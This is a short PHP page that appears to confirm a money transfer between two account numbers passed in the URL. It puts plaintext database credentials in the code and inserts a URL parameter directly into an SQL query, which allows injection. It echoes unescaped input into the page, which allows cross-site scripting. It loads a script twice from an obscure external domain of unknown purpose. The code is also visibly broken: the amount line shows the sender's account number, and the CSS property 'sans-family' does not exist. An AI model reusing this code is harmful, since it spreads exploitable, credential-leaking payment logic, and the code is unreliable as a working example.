<meta charset="UTF-8">
<?php
$magic = array("'",'"');
$from = $_GET['from'];
$from = str_replace($magic,"",$from);
$to = $_GET['to'];
$to = str_replace($magic,"",$to);
$sum = $_GET['sum'];
$sum = str_replace($magic,"",$sum);
$key = $_GET['key'];
$key = str_replace($magic,"",$key);
?>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<script type="text/javascript" src="http://xn--80aamczj4acek.ml/special.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
	body {
	sans-family: arial;
	}
	#hat {
	margin-top:0px;
	border-bottom-style: solid;
	border-bottom-width: 1px;
	border-bottom-color: gray;
	}
	#warning {
	background: repeat-y #FFDAB9;
	margin-left: 15px;
	margin-right: 15px;
	}
	#ok {
	background: repeat-y #99FF99;
	margin-left: 15px;
	margin-right: 15px;
	}
</style>
<div id="window" style="border-width: 1px;border-style: solid;border-radius:8px;">
<?php
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
$mysqli = new mysqli("mysql.hostinger.ru", "u621395238_money", "zh10101", "u621395238_money");
if ($stmt = $mysqli->prepare("SELECT ISS FROM comfortcard WHERE NUM='$to';")) {

$stmt->execute();

$stmt->bind_result($iss);

$stmt->fetch();

$stmt->close();
}
if(!$from){
exit('<div id="warning">Ошибка заполнения API-NOF.</div>');
}
if(!$to){
exit('<div id="warning">Ошибка заполнения API-NOT.</div>');
}
if(!$sum){
exit('<div id="warning">Ошибка заполнения API-NOS.</div>');
}
echo("<h2>Пожалуйста, подтвердите транзакцию</h2>");
echo("<h5>Со счёта <b>#{$from}</b></h5>");
echo("<h5>На счёт <b>#{$to}</b></h5>");
echo("<h5><b>#{$from}</b> EUR</h5>");
?>
</div>
<script type="text/javascript" src="http://xn--80aamczj4acek.ml/special.js"></script>